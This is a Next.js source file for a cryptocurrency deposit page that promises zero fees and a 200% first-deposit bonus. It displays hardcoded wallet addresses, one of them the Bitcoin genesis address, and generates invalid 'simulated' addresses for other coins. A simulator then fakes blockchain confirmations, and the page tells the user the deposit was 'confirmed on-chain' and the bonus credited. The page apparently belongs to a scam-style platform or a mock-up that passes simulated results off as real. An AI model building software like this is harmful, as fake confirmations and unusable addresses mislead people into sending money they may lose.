// app/dashboard/deposit/page.tsx

'use client';

import React, { useState, useEffect } from 'react';
import Header from '../../components/Header';
import Footer from '../../components/Footer';
import { useTronDeposit } from '../../hooks/useTronDeposit';
import { useLivePrices } from '../../hooks/useLivePrices';
import { Clipboard, Smartphone, CheckCircle, Info, Coins } from 'lucide-react';
import Link from 'next/link';

export default function UserDepositPage() {
  const [depositAmount, setDepositAmount] = useState(50);
  const [selectedCoin, setSelectedCoin] = useState('TRX/USD');
  const [copied, setCopied] = useState(false);
  const [success, setSuccess] = useState(false);

  // Fetch all 50 live cryptocurrencies dynamically to allow depositing with ANY of them!
  const livePrices = useLivePrices();

  // Find current exchange rate of selected coin relative to USD
  const currentCoinPrice = livePrices.find((p) => p.symbol === selectedCoin)?.priceUSD || 1;

  const targetAddresses: Record<string, string> = {
    'TRX/USD': 'TL87pX9Z7LhYj6g67SdaD78saH7Gdf2sdC',
    'BTC/USD': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    'ETH/USD': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
    'USDT/USD': 'TXbK7NfAs7D88Yg8G67SdaD78saH7Gdf2sdC',
  };

  // Safe fallback address generator if the coin doesn't have a static one configured
  const getDepositAddress = (symbol: string) => {
    if (targetAddresses[symbol]) return targetAddresses[symbol];
    // Create deterministic simulated address based on coin ticker for any of the 50 coins globally
    const ticker = symbol.split('/')[0];
    return `0x${ticker}87F9d...74${ticker}789saH7Gdf2sd`;
  };

  const targetAddress = getDepositAddress(selectedCoin);

  const { status, confirmations, txHash, startSimulator } = useTronDeposit(() => {
    setSuccess(true);
  });

  const handleCopy = () => {
    navigator.clipboard.writeText(targetAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    startSimulator(depositAmount);
  };

  return (
    <main className="min-h-screen bg-bgDark text-textLight">
      <Header />

      <section className="py-20 px-6 max-w-[800px] mx-auto">
        <div className="bg-primary/20 border border-secondary/10 rounded-card p-8 shadow-card">
          {!success ? (
            <form onSubmit={handleSubmit} className="space-y-8">
              <div className="border-b border-secondary/10 pb-4">
                <h1 className="text-2xl md:text-3xl font-black text-textLight">Multi-Asset Instant Deposit</h1>
                <p className="text-sm text-textMuted mt-1">
                  Fund your account instantly using **ANY** of the top 50 global cryptocurrencies with zero deposit fees. Applies <span className="text-accent font-bold">200% welcome match bonus</span> on first deposit.
                </p>
              </div>

              {/* Coin Selection dropdown */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-bold text-textMuted uppercase mb-1.5">Select Deposit Asset</label>
                  <select
                    value={selectedCoin}
                    onChange={(e) => setSelectedCoin(e.target.value)}
                    className="w-full bg-primary border border-secondary/20 rounded-input p-3 font-mono text-sm text-textLight focus:outline-none focus:border-accent"
                  >
                    {livePrices.map((coin) => (
                      <option key={coin.symbol} value={coin.symbol}>
                        {coin.symbol.split('/')[0]} (Live Price: ${coin.priceUSD.toLocaleString()})
                      </option>
                    ))}
                  </select>
                </div>

                <div>
                  <label className="block text-xs font-bold text-textMuted uppercase mb-1.5">Deposit Amount (USD Equivalent)</label>
                  <input
                    type="number"
                    min="10"
                    max="50000"
                    required
                    value={depositAmount}
                    onChange={(e) => setDepositAmount(Math.max(10, Number(e.target.value)))}
                    className="w-full bg-primary border border-secondary/20 rounded-input p-3 font-mono text-sm text-textLight focus:outline-none focus:border-accent"
                  />
                  <p className="text-[10px] text-textMuted mt-1">Minimum deposit is $10. Max daily limit is $50,000.</p>
                </div>
              </div>

              {/* Dynamic conversion calculator */}
              <div className="bg-primary/35 border border-secondary/10 p-4 rounded-input flex items-center justify-between">
                <div className="flex items-center space-x-2">
                  <Coins className="w-5 h-5 text-accent" />
                  <span className="text-xs font-bold text-textLight">Live Exchange Calculation:</span>
                </div>
                <div className="text-right">
                  <span className="text-sm font-mono font-black text-accent">
                    {(depositAmount / currentCoinPrice).toLocaleString(undefined, { maximumFractionDigits: 6 })}{' '}
                    {selectedCoin.split('/')[0]}
                  </span>
                  <span className="text-xs text-textMuted block">≈ ${depositAmount.toLocaleString()} USD</span>
                </div>
              </div>

              {status !== 'Waiting' ? (
                <div className="bg-bgDark p-6 rounded-card border border-secondary/15 text-center space-y-4">
                  <p className="text-sm font-bold text-textLight">
                    Deposit Status: <span className="text-accent">{status}</span>
                  </p>

                  <div className="flex flex-col items-center justify-center space-y-2">
                    <span className="text-xs text-textMuted font-mono">Blockchain validations:</span>
                    <p className="text-2xl font-mono font-black text-textLight">
                      {confirmations} / 19
                    </p>
                    <div className="w-48 bg-primary/40 h-2 rounded-pill overflow-hidden">
                      <div
                        className="bg-accent h-full transition-all duration-300"
                        style={{ width: `${(confirmations / 19) * 100}%` }}
                      ></div>
                    </div>
                  </div>

                  {txHash && (
                    <div className="text-xs text-textMuted border-t border-secondary/10 pt-4 mt-2 text-left">
                      <p className="font-semibold">Transaction ID:</p>
                      <p className="font-mono bg-primary p-2 rounded mt-1 break-all select-all">{txHash}</p>
                    </div>
                  )}
                </div>
              ) : (
                <div className="space-y-6">
                  {/* Custom Transfer Block */}
                  <div className="bg-bgDark/80 p-6 rounded-card border border-secondary/15 space-y-4">
                    <p className="text-xs font-bold text-textMuted uppercase tracking-wider">
                      Generated {selectedCoin.split('/')[0]} Deposit Address
                    </p>

                    <div className="flex flex-col sm:flex-row items-center sm:space-x-6 gap-4">
                      {/* Premium simulated QR Code representation */}
                      <div className="w-32 h-32 bg-white rounded-input p-2 flex items-center justify-center shrink-0">
                        <div className="w-full h-full bg-slate-900 rounded flex flex-col items-center justify-center text-accent text-center p-1">
                          <Smartphone className="w-6 h-6 mb-1" />
                          <span className="text-[9px] font-mono font-bold leading-tight">SCAN TO TRANSFER</span>
                        </div>
                      </div>

                      <div className="space-y-2 flex-1 w-full">
                        <label className="text-xs text-textMuted font-bold">Copy Your Unique Address</label>
                        <div className="flex">
                          <input
                            type="text"
                            readOnly
                            value={targetAddress}
                            className="w-full bg-primary border border-secondary/20 rounded-l-input p-3 font-mono text-xs text-textLight focus:outline-none"
                          />
                          <button
                            type="button"
                            onClick={handleCopy}
                            className="bg-secondary hover:bg-secondary/95 text-textLight font-bold px-4 rounded-r-input text-xs"
                          >
                            {copied ? 'Copied!' : 'Copy'}
                          </button>
                        </div>
                        <p className="text-[10px] text-textMuted leading-relaxed">
                          ⚠️ Warning: Send ONLY {selectedCoin.split('/')[0]} to this address. Any other token might be permanently lost.
                        </p>
                      </div>
                    </div>
                  </div>

                  <button
                    type="submit"
                    className="w-full bg-gradient-primary hover:shadow-glow text-primary font-black text-lg py-4 rounded-button transition-all"
                  >
                    Initiate Deposit Verification
                  </button>
                </div>
              )}
            </form>
          ) : (
            <div className="text-center space-y-6 py-8">
              <div className="w-16 h-16 rounded-full bg-accent/20 border border-accent flex items-center justify-center mx-auto mb-4">
                <CheckCircle className="w-10 h-10 text-accent" />
              </div>

              <h2 className="text-3xl font-black text-textLight">🎉 Deposit Successful!</h2>
              <p className="text-textMuted font-semibold text-sm max-w-md mx-auto leading-relaxed">
                Your deposit transaction has been successfully confirmed on-chain. Your account balance and 200% match bonus credit have been fully updated!
              </p>

              <div className="pt-6">
                <Link
                  href="/dashboard"
                  className="bg-gradient-cta text-primary font-black text-lg px-8 py-4 rounded-button hover:shadow-glow transition-all inline-block"
                >
                  Return to Dashboard
                </Link>
              </div>
            </div>
          )}
        </div>
      </section>

      <Footer />
    </main>
  );
}
